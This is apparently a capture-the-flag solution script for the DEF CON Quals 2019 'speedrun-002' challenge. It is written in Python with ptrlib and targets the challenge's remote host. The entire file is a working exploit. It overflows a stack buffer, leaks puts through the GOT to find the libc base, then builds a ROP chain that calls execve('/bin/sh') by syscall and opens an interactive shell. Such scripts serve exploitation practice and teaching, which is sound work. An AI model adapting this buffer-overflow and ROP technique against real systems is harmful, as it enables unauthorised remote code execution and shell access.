from ptrlib import *
from time import sleep

elfpath = "./speedrun-002"

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF(elfpath)
sock = Socket("speedrun-002.quals2019.oooverflow.io", 31337)
#sock = Process(elfpath)

plt_read = 0x4005e0
plt_puts = 0x4005b0

rop_pop_rdi = 0x004008a3
rop_pop_rsi_r15 = 0x004008a1
rop_pop_rdx = 0x004006ec

sock.send("Everything intelligent is so boring.")
sock.recvuntil("thing to say.")

payload = b'A' * 0x408
payload += p64(rop_pop_rdi)
payload += p64(elf.got("puts"))
payload += p64(plt_puts)
payload += p64(0x400600)
payload += p64(0xffffffffffffffdd)
sock.sendline(payload)

sock.recvline()
sock.recvline()
sock.recvline()
addr_puts = u64(sock.recvline().rstrip())
libc_base = addr_puts - libc.symbol("puts")
dump("libc base = " + hex(libc_base))

sock.recvuntil("What say you now?")
sock.send("Everything intelligent is so boring.")
sock.recvuntil("thing to say.")

rop_pop_rax = libc_base + 0x000439c7
rop_syscall = libc_base + 0x000d2975

payload = b'A' * 0x408
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(rop_pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
sock.sendline(payload)

sock.interactive()
